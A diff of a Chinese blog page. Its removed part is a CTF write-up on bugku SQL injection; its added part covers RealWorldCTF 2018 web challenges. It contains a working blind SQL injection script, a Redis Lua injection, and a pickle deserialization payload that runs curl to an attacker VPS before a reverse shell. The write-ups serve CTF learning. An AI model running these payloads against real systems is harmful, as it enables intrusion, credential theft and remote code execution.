@@ -15,7 +15,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>一道CTF题引发的思考-sql注入 · Sky&#39;s blog</title>
+    <title>RealWorldCTF-Web · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">一道CTF题引发的思考-sql注入</a>
+                <a href="#" class="post-name">RealWorldCTF-Web</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            一道CTF题引发的思考-sql注入
+            RealWorldCTF-Web
             <!-- 404 -->
             
         </h1>
@@ -261,12 +261,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,556</span> / Reading time: <span class="post-count">6 min</span></span>
+                        <span>Word count: <span class="post-count">2,245</span> / Reading time: <span class="post-count">10 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/15</span>
+                    <span class="post-intro-time">2018/08/17</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -391,36 +391,48 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <blockquote>
-<p>文章首发在 <a href="https://xz.aliyun.com/t/2583" target="_blank" rel="noopener">https://xz.aliyun.com/t/2583</a></p>
+<p>文章首发在 <a href="https://www.anquanke.com/post/id/153259" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153259</a></p>
 </blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做培训和题目讲解的时候，做到bugku的一道题目，bugku的题目想必ctfer都已经耳熟能详了，网上的writeup铺天盖地。<br>但我今天单独写了一篇文章来写一道题肯定是有原因的，其中一道题是这样的：<br>1.网上铺天盖地的writeup写到：直接访问<code>http://120.24.86.145:8007/web2/flag</code>即可得到flag<br>2.此题真坑，竟然是脑洞，访问flag文件就好了<br>…..<br>我看到题目价值200分，放在bugku众多web的后段，怎么看都不是一个脑洞访问一下就完事的题目<br>于是开始了正规解法的思考</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/images/2018-08-15-21-54-12.png" alt=""><br>题目说了是sql注入，并且提及了一些关键符号，估计是过滤了吧<br>看到398的solves挺吃惊的，不知道其中有多少是直接访问wen目录下flag文件得到的solve= =<br>先简单的做一个文件探测<br><img src="/images/2018-08-15-21-55-44.png" alt=""><br>于是来一波文件泄露下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8007/web2/.DS_Store</span><br></pre></td></tr></table></figure></p>
-<p>而我们知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。</span><br></pre></td></tr></table></figure></p>
-<p>即便如此，有时候该文件中也会藏匿一些信息，但这里打开后发现<br><img src="/images/2018-08-15-22-05-19.png" alt=""><br>并没有藏匿什么信息<br>那再看看admin目录<br><img src="/images/2018-08-15-22-07-33.png" alt=""><br>于是信息搜集无果= =<br>目前只知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!,!=,=,+,-,^,%</span><br></pre></td></tr></table></figure></p>
-<p>应该都过滤了</p>
-<h2 id="sql探测"><a href="#sql探测" class="headerlink" title="sql探测"></a>sql探测</h2><p>随手探测<br><img src="/images/2018-08-15-22-09-20.png" alt=""><br><img src="/images/2018-08-15-22-09-35.png" alt=""><br>发现有password和username两个不同的error<br>猜想这大概说明可以bool盲注了吧（不用sleep还是挺开心的）<br>那么思路很清晰了<br>在username处构造一个引号闭合方式，尝试让其回显password error<br>继续随手测了一下<br><img src="/images/2018-08-15-22-11-16.png" alt=""><br>发现如果被过滤，会提示，还挺好，这样探测就容易许多了<br>那么fuzz一下好了<br><img src="/images/2018-08-15-22-13-45.png" alt=""><br>发现这些字符被过滤了,又跑了波sql-func的字典<br><img src="/images/2018-08-15-22-17-26.png" alt=""><br>我最爱的regexp和like也都没了，心痛<br>最开始被带沟里了，以为题目的提示是过滤的意思，然后卡在这里很痛苦<br>但是后来一想，不对啊<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!,!=,=,+,-,^,%</span><br></pre></td></tr></table></figure></p>
-<p>都还在！提示是这个意思！<br>于是想到用<code>^</code>去闭合，但是这里尝试无果<br>一般在数字型的时候，<code>^</code>会有比较好的效果<br>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1^1</span><br><span class="line">?id=1^0</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2018-08-15-22-32-30.png" alt=""><br>那么没有空格，or，and等等关键词，怎么办呢？<br>这里发现运算符<code>-</code>瞩目<br>我们尝试构造<br><img src="/images/2018-08-15-22-33-55.png" alt=""><br>这里在运算的时候，字符串变成0<br>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;admin&apos;-1-&apos;&apos; =  -1</span><br><span class="line">&apos;admin&apos;-0-&apos;&apos; =  0</span><br></pre></td></tr></table></figure></p>
-<p>那我们放入题目中测试<br><img src="/images/2018-08-15-22-35-32.png" alt=""><br><img src="/images/2018-08-15-22-35-40.png" alt=""><br>我们发现<code>-0</code>的时候，为true，<code>-1</code>的时候为false<br>那么这是为什么呢？<br>我们猜想后台sql语句构造为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * from users where username=$username;</span><br></pre></td></tr></table></figure></p>
-<p>在字符串username的值和数字0比较的时候，字符串变为了0<br>故此0=0<br><img src="/images/2018-08-15-22-37-10.png" alt=""><br>这样一来，我们成功的闭合了引号</p>
-<h2 id="sql注入语句构造"><a href="#sql注入语句构造" class="headerlink" title="sql注入语句构造"></a>sql注入语句构造</h2><p>我们尝试构造出类似于下面这个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))&gt;-1</span><br></pre></td></tr></table></figure></p>
-<p>这样把这个语句放在0和1的位置，即可取出数据<br>但是这里问题重重：<br>1.没有逗号<br>2.没有空格<br>那么解决第一个问题，substr很难用，我们怎么截取？<br>这里给出一个实例<br>假设：<br>passwd=abc123<br>那么我们用以下方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mid((passwd)from(-1)):3</span><br><span class="line">mid((passwd)from(-2)):23</span><br><span class="line">mid((passwd)from(-3)):123</span><br></pre></td></tr></table></figure></p>
-<p>倒叙输出from的位数<br>观察可知<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">23</span><br><span class="line">123</span><br></pre></td></tr></table></figure></p>
-<p>倒着看的第一位都是3，显然不行，无法截取出来，于是想到反转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">32</span><br><span class="line">321</span><br></pre></td></tr></table></figure></p>
-<p>然后取最后一位即可<br>故构造为：<br>先反转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVERSE(MID((passwd)from(-%d))</span><br></pre></td></tr></table></figure></p>
-<p>再取最后一位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(REVERSE(MID((passwd)from(-%d)))from(-1))</span><br></pre></td></tr></table></figure></p>
-<p>再比较ascii码值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d</span><br></pre></td></tr></table></figure></p>
-<p>然后列出范围<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s in range(1,33)</span><br><span class="line">d in range(33,127)</span><br></pre></td></tr></table></figure></p>
-<p>我们测试一下<br><img src="/images/2018-08-15-22-48-44.png" alt=""><br><img src="/images/2018-08-15-22-48-57.png" alt=""><br>发现中间条件成立时的回显是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username error</span><br></pre></td></tr></table></figure></p>
-<p>不成立的时候回显是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password error</span><br></pre></td></tr></table></figure></p>
-<p>剩下的就是脚本构造了<br>注：这里说一下passwd字段怎么来的<br>这里其实我是用了点猜想，看到post表单里<br><img src="/images/2018-08-15-22-53-03.png" alt=""><br>id用的是passwd，所以用的passwd，为什么不去探测数据库和表。。因为or等很多关键词都没有，探测非常困难，不如猜一下= =<br>不过不能误人子弟，数据库的字段名和post表单里的id,name等不是一回事，不等价，我这里是猜想的！</p>
-<h2 id="注入脚本编写"><a href="#注入脚本编写" class="headerlink" title="注入脚本编写"></a>注入脚本编写</h2><p>简单写出脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.24.86.145:8007/web2/login.php"</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'i6f9opt690kralopas7lcj68ne9na6ev'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        payload = <span class="string">"admin'-(ascii(mid(REVERSE(MID((passwd)from(-"</span>+str(i)+<span class="string">")))from(-1)))="</span>+str(ord(j))+<span class="string">")-'"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>: payload,</span><br><span class="line">            <span class="string">'passwd'</span>: <span class="string">'sky'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,cookies=cookie,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username error!!@_@"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            password += j</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p>运行得到<br><img src="/images/2018-08-15-22-58-17.png" alt=""><br>注：这里是因为跑了前几位，猜想是md5，所以为了效率，缩小了遍历范围= =<br>得到密码的md5后，进行解密<br><img src="/images/2018-08-15-22-59-14.png" alt=""><br>cmd5个坑货竟然还要收费，乖乖交钱后，发现密码是<code>admin123</code></p>
-<h2 id="登入admin"><a href="#登入admin" class="headerlink" title="登入admin"></a>登入admin</h2><p>随机用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure></p>
-<p>登录<br><img src="/images/2018-08-15-23-00-29.png" alt=""><br>来到一个命令执行的页面<br>他暗示我要ls。。我就ls了一下<br>然后<br><img src="/images/2018-08-15-23-00-56.png" alt=""><br>感觉这里题目没有出好<br>私以为后面应该接上用<code>?</code>通配，或者RCE OOB带出数据等操作出题<br>相关链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2017/12/29/Time-Based-RCE/</span><br><span class="line">https://www.anquanke.com/post/id/154284</span><br></pre></td></tr></table></figure></p>
-<p>不过flag还是顺利的拿到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sql_iNJEct_comMon3600!&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目的sql注入部分还是挺有趣的，做完后后知后觉，想起以前似乎做过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2017/06/18/%E9%99%95%E8%A5%BF%E6%9D%AFweb%E8%AF%A6%E8%A7%A3/</span><br></pre></td></tr></table></figure></p>
-<p>但是单从这道题来看，个人认为ctf训练平台，还是要刨根问底的，flag并不是关键目的<br>这里也是出题人的疏忽，将flag放在当前目录(为了方便命令执行？)<br>菜鸡献丑了XD…..</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>恰逢暑假，听说长亭科技出题，于是兴致勃勃参赛，结果被虐到自闭<br>好在中途有巨佬指点，得以存活，故此写下writeup，感慨一下自己有多菜</p>
+<h2 id="Advertisement"><a href="#Advertisement" class="headerlink" title="Advertisement"></a>Advertisement</h2><p><img src="/images/2018-07-28-12-34-39.png" alt=""><br>题目打开有点迷，没有任何东西<br>下意识的进行文件泄露探测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip</span><br></pre></td></tr></table></figure></p>
+<p>得到flag<br><img src="/images/2018-07-28-12-35-16.png" alt=""></p>
+<h2 id="BookHub"><a href="#BookHub" class="headerlink" title="BookHub"></a>BookHub</h2><p><img src="/images/2018-07-29-07-38-32.png" alt=""><br>拿到题目后发现有源码泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://52.52.4.252:8080/www.zip</span><br></pre></td></tr></table></figure></p>
+<p>下载下来后发现是flask框架写的<br>简单浏览了一下路由<br>发现大部分功能都是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@login_required</span><br></pre></td></tr></table></figure></p>
+<p>所以先尝试登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://52.52.4.252:8080/login</span><br></pre></td></tr></table></figure></p>
+<p>随手尝试一下，发现<br><img src="/images/2018-07-29-07-41-44.png" alt=""><br>于是去跟过滤<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@user_blueprint.route('/login/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    form = LoginForm(data=flask.request.data)</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.username.data).first()</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">'book.admin'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">'login.html'</span>, form=form)</span><br></pre></td></tr></table></figure></p>
+<p>跟到<code>LoginForm</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    username = StringField(<span class="string">'username'</span>, validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(<span class="string">'password'</span>, validators=[DataRequired()])</span><br><span class="line">    remember_me = BooleanField(<span class="string">'remember_me'</span>, default=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_password</span><span class="params">(self, field)</span>:</span></span><br><span class="line">        address = get_remote_addr()</span><br><span class="line">        whitelist = os.environ.get(<span class="string">'WHITELIST_IPADDRESS'</span>, <span class="string">'127.0.0.1'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If you are in the debug mode or from office network (developer)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> app.debug <span class="keyword">and</span> <span class="keyword">not</span> ip_address_in(address, whitelist):</span><br><span class="line">            <span class="keyword">raise</span> StopValidation(<span class="string">f'your ip address isn\'</span>t <span class="keyword">in</span> the &#123;whitelist&#125;.<span class="string">')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        user = User.query.filter_by(username=self.username.data).first()</span></span><br><span class="line"><span class="string">        if not user or not user.check_password(field.data):</span></span><br><span class="line"><span class="string">            raise StopValidation('</span>Username <span class="keyword">or</span> password error.<span class="string">')</span></span><br></pre></td></tr></table></figure></p>
+<p>再跟到<code>get_remote_addr()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_remote_addr</span><span class="params">()</span>:</span></span><br><span class="line">    address = flask.request.headers.get(<span class="string">'X-Forwarded-For'</span>, flask.request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ipaddress.ip_address(address)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure></p>
+<p>发现address来自于<code>X-Forwarded-For</code>，若不存在则来自于remote_addr<br>那么应该是可以使用XFF伪造ip了<br>我们本地测试一下<br><img src="/images/2018-07-29-07-45-56.jpg" alt=""><br><img src="/images/2018-07-29-07-45-40.jpg" alt=""><br>发现是可以伪造的，然而题目却怎么也不行= =（不知道什么鬼）<br>绝望之际，发现白名单中有一个公网ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18.213.16.123</span><br></pre></td></tr></table></figure></p>
+<p>直接打开，是没有http服务的，随手测试了flask的默认端口，有点意思<br><img src="/images/2018-07-29-07-48-10.png" alt=""><br>原来这才是真正的大坑，这里网站直接跑在了debug模式<br>迅速去看代码里的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> app.debug:</span><br></pre></td></tr></table></figure></p>
+<p>发现<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="meta">@user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refresh_session</span><span class="params">()</span>:</span></span><br></pre></td></tr></table></figure></p>
+<p>我们尝试这个路由<br><img src="/images/2018-07-29-07-53-06.png" alt=""><br>添加csrf_token<br><img src="/images/2018-07-29-07-54-44.png" alt=""><br>发现refresh_session()竟然存在未授权访问<br>（至于为什么@login_required写了还能未授权访问?大概是因为@login_required写在上面了，仔细观察，别的都写在user_blueprint.route下面）<br>关注到后续代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">status = <span class="string">'success'</span></span><br><span class="line">        sessionid = flask.session.sid</span><br><span class="line">        prefix = app.config[<span class="string">'SESSION_KEY_PREFIX'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flask.request.form.get(<span class="string">'submit'</span>, <span class="keyword">None</span>) == <span class="string">'1'</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rds.eval(<span class="string">rf'''</span></span><br><span class="line"><span class="string">                local function has_value (tab, val)</span></span><br><span class="line"><span class="string">                    for index, value in ipairs(tab) do</span></span><br><span class="line"><span class="string">                        if value == val then</span></span><br><span class="line"><span class="string">                            return true</span></span><br><span class="line"><span class="string">                        end</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                    return false</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                local inputs = <span class="subst">&#123;&#123; <span class="string">"&#123;prefix&#125;&#123;sessionid&#125;"</span> &#125;</span>&#125;</span></span><br><span class="line"><span class="string">                local sessions = redis.call("keys", "<span class="subst">&#123;prefix&#125;</span>*")</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                for index, sid in ipairs(sessions) do</span></span><br><span class="line"><span class="string">                    if not has_value(inputs, sid) then</span></span><br><span class="line"><span class="string">                        redis.call("del", sid)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                '''</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">except</span> redis.exceptions.ResponseError <span class="keyword">as</span> e:</span><br><span class="line">                app.logger.exception(e)</span><br><span class="line">                status = <span class="string">'fail'</span></span><br></pre></td></tr></table></figure></p>
+<p>这里明显使用了redis lua,看来是要在session上做文章了<br>我们发现代码中具有可控点<code>sessionid</code><br>并且这里存在严重拼接问题<br>例如<br><img src="/images/2018-07-29-08-27-27.png" alt=""><br>我们可以闭合双引号，并引入恶意代码，让redis去执行<br>(注:f是python3.6的新特性，在2018MeePwnCTF曾出现过一道使用该特性的题目，不再赘述)<br>我们观察到构造方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local inputs = &#123;&#123; <span class="string">"&#123;prefix&#125;&#123;sessionid&#125;"</span> &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>跟一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix = app.config[<span class="string">'SESSION_KEY_PREFIX'</span>]</span><br></pre></td></tr></table></figure></p>
+<p>发现<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SESSION_KEY_PREFIX'</span>] = <span class="string">'bookhub:session:'</span></span><br></pre></td></tr></table></figure></p>
+<p>于是即可构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6f17c248-ed0d-4d74-bba6-21b9342c854a&quot;,redis evilcode,&quot;bookhub:session:skycool</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-07-29-08-49-46.png" alt=""><br>代码拼接后变成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$python3 main.py</span><br><span class="line">&#123; <span class="string">"bookhub:session:6f17c248-ed0d-4d74-bba6-21b9342c854a"</span>,redis evilcode,<span class="string">"bookhub:session:skycool"</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>显而易见，下面我们只需要思考构造<code>redis evilcode</code>即可<br>这里参考ph的两篇文章（当然要参考出题人写过的文章呀XD）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</span><br><span class="line">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</span><br></pre></td></tr></table></figure></p>
+<p>其中ph的两篇文章分别有提到：<br><img src="/images/2018-07-29-08-53-31.png" alt=""><br><img src="/images/2018-07-29-08-53-42.png" alt=""><br>23333越看越像这道题<br>既然如此，我们可以给自己构造的一个session赋反弹shell的值，于是构造如下evilcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis.call(&quot;set&quot;,&quot;bookhub:session:skycool&quot;,反弹shell)</span><br></pre></td></tr></table></figure></p>
+<p>打完之后将自己的session改为skycool，刷新反弹shell即可<br>那么开始实操，我们先尝试一下curl</p>
+<p>生成反弹shell payload代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl vps_ip:23333"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line">s_bypass = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	s_bypass +=<span class="string">"string.char(%s).."</span>%ord(i)</span><br><span class="line">evilcode = <span class="string">'''</span></span><br><span class="line"><span class="string">redis.call("set","bookhub:session:skycool",%s)</span></span><br><span class="line"><span class="string">'''</span>%s_bypass[:<span class="number">-2</span>]</span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">6f17c248-ed0d-4d74-bba6-21b9342c854a",%s,"bookhub:session:skycool</span></span><br><span class="line"><span class="string">'''</span>%evilcode</span><br><span class="line"><span class="keyword">print</span> payload.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
+<p>然后<br><img src="/images/2018-07-29-09-47-38.png" alt=""><br>再<br><img src="/images/2018-07-29-09-47-55.png" alt=""><br>然后去登录<br>发现自己的vps收到访问<br><img src="/images/2018-07-29-09-48-20.png" alt=""><br>此时眼泪哗的一下流了下来<br>同理反弹shell即可<br><img src="/images/2018-07-29-10-30-59.png" alt=""><br><img src="/images/2018-07-29-10-31-09.png" alt=""></p>
